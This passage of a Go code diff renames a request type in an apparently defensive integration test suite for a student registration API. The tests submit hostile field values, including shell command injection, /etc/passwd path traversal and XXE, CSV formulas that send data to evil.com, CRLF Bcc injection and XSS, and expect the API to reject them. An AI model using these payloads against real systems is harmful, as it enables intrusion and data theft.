-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = "STU001;cat /etc/passwd"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1105,7 +1105,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Command Injection with Backticks",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "`whoami`"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1114,7 +1114,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Command Injection with Pipe",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = "STU001|id"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1125,7 +1125,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// LDAP Injection
 		{
 			name: "LDAP Injection with Wildcard",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = "*)(uid=*))(|(uid=*@test.com"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1134,7 +1134,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "LDAP Injection with Boolean Logic",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "admin)(|(password=*"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1145,7 +1145,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// Path Traversal
 		{
 			name: "Path Traversal with Dot Dot Slash",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "../../../etc/passwd"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1154,7 +1154,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Path Traversal with URL Encoding",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "..%2F..%2F..%2Fetc%2Fpasswd"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1163,7 +1163,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Path Traversal with Double Encoding",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "..%252f..%252f..%252fetc%252fpasswd"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1174,7 +1174,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// Unicode and Encoding Attacks
 		{
 			name: "Unicode Normalization Bypass",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "ＡＤＭİＮ" // Full-width and Turkish i
 			},
 			expectedStatus: http.StatusOK,
@@ -1186,7 +1186,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Homograph Attack with Cyrillic",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = "аdmin@test.com" // Cyrillic 'а' instead of Latin 'a'
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1195,7 +1195,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Zero-Width Characters Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "John\u200B\u200CSmith" // Zero-width space and non-joiner
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1204,7 +1204,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "UTF-8 Overlong Encoding",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = "STU\xc0\xbc001" // Overlong encoding
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1215,7 +1215,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// CSV Injection
 		{
 			name: "CSV Formula Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "=1+1+cmd|'/c calc'!A1"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1224,7 +1224,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "CSV Injection with HYPERLINK",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "=HYPERLINK(\"http://evil.com?data=\"&A1&A2,\"Click\")"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1235,7 +1235,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// XML/XXE Injection
 		{
 			name: "XXE Attack Payload",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1244,7 +1244,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "XML Bomb (Billion Laughs)",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]>"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1255,7 +1255,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// Header Injection
 		{
 			name: "CRLF Injection in Email",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = "test@test.com\r\nBcc:attacker@evil.com"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1264,7 +1264,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "HTTP Response Splitting",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "John\r\n\r\n<script>alert(1)</script>"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1275,7 +1275,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// JSON Injection
 		{
 			name: "JSON Structure Breaking",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "\",\"role\":\"admin\",\"name\":\""
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1284,7 +1284,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "JSON Unicode Escape Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "\\u0022,\\u0022role\\u0022:\\u0022admin\\u0022"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1295,7 +1295,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// Regular Expression DoS (ReDoS)
 		{
 			name: "ReDoS Attack Pattern",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = strings.Repeat("a", 50) + strings.Repeat("a!", 50) + "@test.com"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1306,7 +1306,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// Format String Attack
 		{
 			name: "Format String Vulnerability",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "%s%s%s%s%s%s%s%s%s%s"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1315,7 +1315,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Printf Format Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "%x %x %x %x"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1326,7 +1326,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// Business Logic Bypass Attempts
 		{
 			name: "Case Variation Bypass",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "aDmIn"
 			},
 			expectedStatus: http.StatusOK,
@@ -1335,7 +1335,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Negative Number Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.VerificationCode = "-1"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1344,7 +1344,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Emoji Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "John😀Smith"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1353,7 +1353,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Right-to-Left Override",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "Smith\u202Etxt.exe" // RLO character
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1362,7 +1362,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Name with Numbers",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "John123"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1371,7 +1371,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Name with HTML Tags",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "<script>alert('xss')</script>"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1380,7 +1380,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Name with Special Symbols",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "John@#$%"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1391,7 +1391,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 
 	for _, tt := range tests {
 		s.T().Run(tt.name, func(t *testing.T) {
-			request := registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+			request := registrationhttp.CompleteStudentRegistrationRequest{
 				Email:            fixtures.TestStudent.Email,
 				VerificationCode: "123456",
 				Password:         fixtures.TestStudent.Password,
@@ -1436,7 +1436,7 @@ func (s *RegistrationIntegrationSuite) setupVerifiedRegistration(email string) {
 
 func (s *RegistrationIntegrationSuite) setupCompletedRegistration(email string) {
 	s.setupVerifiedRegistration(email)
-	s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+	s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
 		Email:            email,
 		VerificationCode: s.getVerificationCode(email),
 		Password:         fixtures.TestStudent.Password,
